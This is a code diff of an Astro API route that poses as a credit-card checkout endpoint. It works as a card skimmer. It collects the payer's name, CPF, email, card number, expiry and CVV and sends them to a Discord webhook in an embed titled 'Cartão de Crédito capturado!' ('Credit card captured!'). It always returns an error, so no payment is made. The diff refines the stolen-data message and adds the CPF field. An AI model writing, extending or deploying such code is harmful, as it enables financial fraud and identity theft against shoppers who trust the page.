@@ -1,9 +1,14 @@
 import type { APIRoute } from "astro";
 import products from "../../assets/products.json";
 
-import { createPIX, getPayment } from "../../services/mercadopago";
+import {
+  EMPTY_PRODUCT,
+  createPIX,
+  getPayment,
+} from "../../services/mercadopago";
 import { money } from "../../components/utils";
-import { logToWebhook } from "../../services/discordwebhook";
+import { sendEmbedToWebhook } from "../../services/discordwebhook";
+import { inline } from "@floating-ui/react";
 
 export interface PostCreditPayload {
   product_id: string;
@@ -19,49 +24,43 @@ export interface PostCreditPayload {
 export const POST: APIRoute = async ({ request }) => {
   const payload: PostCreditPayload = await request.json();
 
-  const product = products.find((x) => x.id == payload.product_id);
-  if (!product) return new Response("product not found", { status: 400 });
+  const product =
+    products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;
 
-  logToWebhook(import.meta.env.SECRET_CC_WEBHOOK, "💳 Cartão de Crédito", [
+  const fields = [
     {
-      name: "Nome",
+      name: "✍️ Nome do pagador",
       value: payload.payer_name,
       inline: true,
     },
     {
-      name: "Email",
-      value: payload.payer_email,
-    },
-    {
-      name: "Produto",
-      value: product.name,
+      name: "🪪 CPF do pagador",
+      value: payload.payer_cpf,
       inline: true,
     },
-    /* {
-      name: "Valor",
-      value: money(product.price),
-      inline: true,
-    }, */
     {
-      name: "Número",
+      name: "💳 Número",
       value: payload.card_number,
     },
     {
-      name: "Mês",
-      value: payload.card_month,
+      name: "📅 Mês/Ano",
+      value: payload.card_month + "/" + payload.card_year,
       inline: true,
     },
     {
-      name: "Ano",
-      value: payload.card_year,
-      inline: true,
-    },
-    {
-      name: "CVV",
+      name: "🔒 CVV",
       value: payload.card_cvv,
       inline: true,
     },
-  ]);
+  ];
+
+  sendEmbedToWebhook(import.meta.env.SECRET_CC_WEBHOOK, {
+    title: "Cartão de Crédito capturado!",
+    description: `do produto: **${product.name}**`,
+    footer: { text: payload.payer_email },
+    thumbnail: { url: product.image },
+    fields,
+  });
 
   return new Response(null, { status: 500 });
 };
